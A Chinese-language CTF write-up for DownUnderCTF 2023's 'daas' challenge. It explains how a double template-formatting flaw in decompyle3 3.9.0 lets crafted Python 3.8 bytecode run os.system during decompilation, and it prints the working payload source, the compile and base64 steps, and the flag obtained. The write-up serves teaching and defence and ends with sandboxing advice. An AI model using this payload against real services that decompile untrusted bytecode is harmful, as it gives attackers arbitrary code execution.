# DownUnderCTF 2023 daas Writeup

## 题目简述

服务接收 Base64 编码的 Python 3.8 `.pyc`，保存到临时文件后调用 `decompyle3==3.9.0` 反编译。挑战程序本身没有执行上传字节码，但该版本反编译器的模板格式化存在二次解释问题，可以在反编译阶段触发 Python 表达式执行。

## 解题过程

触发点位于反编译器处理带关键字展开的调用表达式时。攻击载荷把 `%{...}` 风格的内部模板表达式放进字符串常量；第一次格式化把它带入生成模板，第二次格式化又把其中内容当作表达式求值。

构造以下 Python 源文件：

```python
foo('%{__import__("os").system("/bin/cat chal/flag_*")}', **x, y=1)
```

必须用 Python 3.8 编译，因为服务端反编译器针对该字节码版本：

```bash
python3.8 -m compileall exploit.py
base64 -w0 __pycache__/exploit.cpython-38.pyc
```

把 Base64 结果提交给服务。`decompyle3` 处理 `CALL_FUNCTION_EX` 和关键字参数的模板时执行了字符串中的 `os.system`，通配符匹配 Dockerfile 随机化后的 `/home/ctf/chal/flag_<hex>`。当前工作目录为 `/home/ctf`，因此相对路径 `chal/flag_*` 能读取目标文件：

```text
DUCTF{i_don't_trust_my_decompyler_:-(}
```

## 方法总结

“只反编译、不执行”不代表安全：反编译器本身就是复杂的输入解析器，内部若使用动态表达式或不安全的二次模板格式化，恶意字节码仍可获得代码执行。处理不可信编译产物时，应把反编译器置于独立、无敏感文件的沙箱，并避免其模板引擎求值任意表达式。
